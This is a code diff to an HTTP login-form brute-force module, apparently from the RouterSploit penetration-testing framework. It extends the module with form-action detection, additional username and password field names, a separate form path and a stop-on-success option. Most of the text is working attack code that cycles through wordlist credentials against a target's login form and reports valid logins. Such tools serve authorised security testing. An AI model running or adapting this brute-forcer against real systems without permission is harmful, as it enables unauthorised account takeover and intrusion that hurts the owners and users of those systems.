@@ -24,9 +24,17 @@ class Exploit(exploits.Exploit):
     """
     __info__ = {
         'name': 'HTTP Form Bruteforce',
-        'author': [
-            'Marcin Bury <marcin.bury[at]reverse-shell.com>'  # routersploit module
-        ]
+        'description': 'Module performs bruteforce attack against HTTP form service. '
+                       'If valid credentials are found, they are displayed to the user.',
+        'authors': [
+            'Marcin Bury <marcin.bury[at]reverse-shell.com>',  # routersploit module
+        ],
+        'references': [
+            '',
+        ],
+        'devices': [
+            'Multi',
+        ],
     }
 
     target = exploits.Option('', 'Target IP address or file with target:port (file://)')
@@ -34,9 +42,11 @@ class Exploit(exploits.Exploit):
     threads = exploits.Option(8, 'Number of threads')
     usernames = exploits.Option('admin', 'Username or file with usernames (file://)')
     passwords = exploits.Option(wordlists.passwords, 'Password or file with passwords (file://)')
-    form = exploits.Option('auto', 'Post Data: auto or in form login={{LOGIN}}&password={{PASS}}&submit')
+    form = exploits.Option('auto', 'Post Data: auto or in form login={{USER}}&password={{PASS}}&submit')
     path = exploits.Option('/login.php', 'URL Path')
+    form_path = exploits.Option('same', 'same as path or URL Form Path')
     verbosity = exploits.Option('yes', 'Display authentication attempts')
+    stop_on_success = exploits.Option('yes', 'Stop on first valid authentication attempt')
 
     credentials = []
     data = ""
@@ -46,9 +56,15 @@ class Exploit(exploits.Exploit):
         self.credentials = []
         self.attack()
 
+    def get_form_path(self):
+        if self.form_path == 'same':
+            return self.path
+        else:
+            return self.form_path
+
     @multi
     def attack(self):
-        url = sanitize_url("{}:{}{}".format(self.target, self.port, self.path))
+        url = sanitize_url("{}:{}{}".format(self.target, self.port, self.get_form_path()))
 
         try:
             requests.get(url, verify=False)
@@ -61,11 +77,15 @@ class Exploit(exploits.Exploit):
 
         # authentication type
         if self.form == 'auto':
-            self.data = self.detect_form()
+            form_data = self.detect_form()
 
-            if self.data is None:
+            if form_data is None:
                 print_error("Could not detect form")
                 return
+
+            (form_action, self.data) = form_data
+            if form_action:
+                self.path = form_action
         else:
             self.data = self.form
 
@@ -116,7 +136,7 @@ class Exploit(exploits.Exploit):
                 self.invalid["max"] = l
 
     def detect_form(self):
-        url = sanitize_url("{}:{}{}".format(self.target, self.port, self.path))
+        url = sanitize_url("{}:{}{}".format(self.target, self.port, self.get_form_path()))
         r = requests.get(url, verify=False)
         soup = BeautifulSoup(r.text, "lxml")
 
@@ -125,20 +145,22 @@ class Exploit(exploits.Exploit):
         if form is None:
             return None
 
+        action = form.attrs.get('action', None)
+
         if len(form) > 0:
             res = []
             for inp in form.findAll("input"):
                 if 'name' in inp.attrs.keys():
-                    if inp.attrs['name'].lower() in ["username", "user", "login"]:
+                    if inp.attrs['name'].lower() in ["username", "user", "login", "username_login"]:
                         res.append(inp.attrs['name'] + "=" + "{{USER}}")
-                    elif inp.attrs['name'].lower() in ["password", "pass"]:
+                    elif inp.attrs['name'].lower() in ["password", "pass", "password_login"]:
                         res.append(inp.attrs['name'] + "=" + "{{PASS}}")
                     else:
                         if 'value' in inp.attrs.keys():
                             res.append(inp.attrs['name'] + "=" + inp.attrs['value'])
                         else:
                             res.append(inp.attrs['name'] + "=")
-        return '&'.join(res)
+        return (action, '&'.join(res))
 
     def target_function(self, running, data):
         module_verbosity = boolify(self.verbosity)
@@ -159,7 +181,9 @@ class Exploit(exploits.Exploit):
                 l = len(r.text)
 
                 if l < self.invalid["min"] or l > self.invalid["max"]:
-                    running.clear()
+                    if boolify(self.stop_on_success):
+                        running.clear()
+
                     print_success("Target: {}:{} {}: Authentication Succeed - Username: '{}' Password: '{}'".format(self.target, self.port, name, user, password), verbose=module_verbosity)
                     self.credentials.append((self.target, self.port, user, password))
                 else:
